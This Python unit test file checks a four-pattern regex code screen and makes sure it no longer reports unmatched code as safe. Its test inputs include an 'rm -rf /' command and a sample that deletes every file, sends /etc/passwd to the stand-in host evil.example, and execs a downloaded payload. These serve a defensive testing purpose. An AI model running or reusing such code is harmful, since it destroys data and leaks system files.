"""
Unit tests for the four-pattern regex screen (formerly "Constitutional Guard").

The old suite asserted `rep.is_compliant` on clean code, which pinned the
defect: `is_compliant` was True whenever none of four regexes matched, so code
that walks `/` deleting every file, opens a socket and execs a downloaded
payload was reported COMPLIANT -- none of those behaviours is in the pattern
list.
"""

import unittest
from saleha.core.constitutional_guard import ConstitutionalGuard, ConstitutionalAuditReport


class TestConstitutionalGuard(unittest.TestCase):

    def setUp(self):
        self.guard = ConstitutionalGuard()

    def test_clean_code_matches_no_patterns(self):
        code = "def add(a: int, b: int) -> int:\n    return a + b\n"
        rep = self.guard.audit_code(code, "add.py")
        self.assertIsInstance(rep, ConstitutionalAuditReport)
        self.assertFalse(rep.matched_rules)
        self.assertEqual(len(rep.violations), 0)

    def test_detects_destructive_os_command_violation(self):
        rep = self.guard.audit_code("import os\nos.system('rm -rf /')\n", "wipe.py")
        self.assertTrue(rep.matched_rules)
        self.assertTrue(any(v.clause_id == "CONST_01" for v in rep.violations))

    def test_detects_unsafe_pickle_loads_violation(self):
        rep = self.guard.audit_code("import pickle\npickle.loads(p)\n", "deser.py")
        self.assertTrue(rep.matched_rules)
        self.assertTrue(any(v.clause_id == "CONST_02" for v in rep.violations))

    def test_no_compliance_verdict_is_issued(self):
        """
        `is_compliant` is gone. Four patterns not matching is not a safety
        verdict, and reporting it as one is what made this dangerous.
        """
        rep = self.guard.audit_code("def f(): pass", "x.py")
        self.assertFalse(hasattr(rep, "is_compliant"))
        self.assertNotIn("COMPLIANT", rep.summary.upper())

    def test_summary_says_what_was_checked_not_that_code_is_safe(self):
        rep = self.guard.audit_code("def f(): pass", "x.py")
        self.assertIn("patterns checked", rep.summary)
        self.assertIn("not a safety verdict", rep.summary)
        self.assertIn("sast", rep.summary)

    def test_genuinely_dangerous_code_outside_the_patterns_is_not_cleared(self):
        """
        This deletes every file it can reach, ships /etc/passwd to a remote
        host and execs a downloaded payload. No pattern covers any of it, so
        the screen must report "nothing matched" -- never a clean bill.
        """
        evil = (
            "import os, socket\n"
            "for root, dirs, files in os.walk('/'):\n"
            "    for f in files:\n"
            "        os.remove(os.path.join(root, f))\n"
            "s = socket.socket(); s.connect(('evil.example', 9001))\n"
            "s.send(open('/etc/passwd', 'rb').read())\n"
            "exec(open('payload').read())\n"
        )
        rep = self.guard.audit_code(evil, "evil.py")
        self.assertFalse(rep.matched_rules)
        self.assertIn("not a safety verdict", rep.summary)

    def test_docstring_rule_count_matches_the_implementation(self):
        """The docstring listed five rules; there were four, and two of the
        five listed (sockets, obfuscated payloads) had no pattern at all."""
        import saleha.core.constitutional_guard as mod
        self.assertEqual(len(self.guard.CONSTITUTIONAL_RULES), 4)
        self.assertIn("four", (mod.__doc__ or "").lower())


if __name__ == "__main__":
    unittest.main()
